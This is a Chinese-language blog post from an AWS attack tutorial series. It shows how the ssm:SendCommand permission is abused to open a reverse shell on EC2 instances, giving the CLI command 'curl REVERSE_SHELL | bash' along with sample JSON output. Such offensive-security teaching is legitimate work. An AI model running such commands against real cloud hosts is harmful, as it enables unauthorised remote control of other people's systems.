---
author: Sunny Tsai
title: "[Day 30] 天堂雲端 - SSM"
date: 2023-10-13
math: true
tags: [
    "aws",
    "ec2",
    "ssm"
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-天堂雲端之從開始到接管"]
---
# ssm:SendCommand
擁有該權限的用戶可以發送命令到一個或多個已註冊在SSM的EC2 instance或其他服務，允許在這些instance或主機上執行操作，例如運行腳本、管理更新或執行其他自動化任務。

## 使用send command執行reverse shell

#### AWS SSM Send Command
```shell
> aws ssm send-command --instance-ids {INSTANCE_ID} \
   --document-name "AWS-RunShellScript" --output text \
   --parameters commands="curl REVERSE_SHELL | bash"
```

執行完上面的Command line後會回傳一串json output
Output:
```json
{
    "Command": {
        "CommandId": "XXXXXXXXX",
        "DocumentName": "AWS-RunShellScript",
        "DocumentVersion": "$DEFAULT",
        "Comment": "",
        "ExpiresAfter": "DATE",
        "Parameters": {},
        "InstanceIds": [
            "i-XXXXXXXXX"
        ],
        "Targets": [],
        "RequestedDateTime": "DATE",
        "Status": "Pending",
        "StatusDetails": "Pending",
        "OutputS3Region": "us-east-1",
        "OutputS3BucketName": "",
        "OutputS3KeyPrefix": "",
        "MaxConcurrency": "50",
        "MaxErrors": "0",
        "TargetCount": 1,
        "CompletedCount": 0,
        "ErrorCount": 0,
        "DeliveryTimedOutCount": 0,
        "ServiceRole": "",
        "NotificationConfig": {
            "NotificationArn": "",
            "NotificationEvents": [],
            "NotificationType": ""
        },
        "CloudWatchOutputConfig": {
            "CloudWatchLogGroupName": "",
            "CloudWatchOutputEnabled": false
        },
        "TimeoutSeconds": 3600,
        "AlarmConfiguration": {
            "IgnorePollAlarmFailure": false,
            "Alarms": []
        },
        "TriggeredAlarms": []
    }
}
```

#### 查看detail
```shell
> aws ssm list-command-invocations \
--command-id "{COMMAND_ID}" \   #就是上面那串json的command id
--details
```

### 攔截SSM Session
這個研究中，先上文章
